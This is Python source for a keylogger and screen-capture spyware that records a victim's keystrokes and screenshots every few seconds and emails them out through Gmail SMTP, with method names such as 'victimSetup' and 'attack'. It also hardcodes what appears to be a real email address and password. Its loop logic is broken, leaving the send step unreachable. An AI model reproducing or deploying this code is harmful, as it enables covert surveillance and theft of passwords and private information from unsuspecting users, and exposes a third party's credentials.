import smtplib
import getpass
import time
import os
import sys
from pynput.keyboard import Listener
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.text import MIMEText

class ImageGrabber:

    def __init__(self):
        self.emailid = None
        self.password = None
        self.message = None
        self.toMailid = None
        self.imageTimeGap = None
        self.server = None
        self.login()
        self.victimSetup()
        self.attack()
        # Creating a server object
        
    def login(self):    # Attacker Login

        print('Connecting to the server...')
        try:
            self.server = smtplib.SMTP('smtp.gmail.com',587)
            self.server.ehlo() 
            self.server.starttls()
        except smtplib.SMTPConnectError:
            print('SMTP Connectivity Error')
            quit()
        except ConnectionResetError:
            print('Connection was Reset by peer')
            quit()
        except smtplib.SMTPServerDisconnected:
            print('Server disconnected')
            quit()
        except KeyboardInterrupt:
            quit()
        except Exception:
            print('Internet Connectivity Issue: Please check your Internet connection.')
            quit()

        self.emailid = 'shishodia.shantanu@gmail.com'
        self.password ='ben10rmst'
        try:
            self.server.login(self.emailid, self.password)
            print('[+] Login Sucessfull...!')
        except smtplib.SMTPAuthenticationError:
            print('Authentication Error')
            quit()
        except smtplib.SMTPConnectError:
            print('Internet Connectivity issue: Please Check your internet connection.')
            quit()
        except KeyboardInterrupt:
            quit()
        except Exception:
            print('Something went Wrong...!')
            quit()


    def victimSetup(self):
        self.message = MIMEMultipart()
        self.message['From'] = self.emailid
        self.toMailid = 'shishodia.shantanu@gmail.com'
        self.imageTimeGap = 5
        self.message['To'] = self.toMailid
        self.message['Subject'] = 'Images and Keylogging Details form the victim System.'

    
    def attack(self):

        try:
            while True:
                time.sleep(self.imageTimeGap)
                image = ImageGrab.grab()
                image.save(os.getcwd() + 'image.png')
                image_file = open(os.getcwd() + 'image.png', 'rb')
                def write_to_file(key):
                	letter = str(key)
                	letter = letter.replace("'", "")
                	if letter == 'Key.space':
                		letter = ' '
                	if letter == "Key.enter":
                		letter = "\n"
                	if letter == 'Key.shift_r':
                		letter = ''
                	if letter == "Key.ctrl_l":
                		letter = ""
                	if letter == "Key.esc":
                		return False
                	with open("log.txt", 'a') as f:
                		f.write(letter)
                with Listener(on_press=write_to_file) as l:
                	#print("Write now")
                	while time.sleep(5) is True:
		                l.join()
	                	return False
	                

	                filename = "log.txt"
	                self.message.attach(MIMEText(open(filename).read()))			
                	self.message.attach(MIMEImage(image_file.read()))
                	self.server.sendmail(self.emailid, self.toMailid, self.message.as_string())
                
                	
		                	
                

        except KeyboardInterrupt:
            print('\n')
            quit()


ImageGrabber()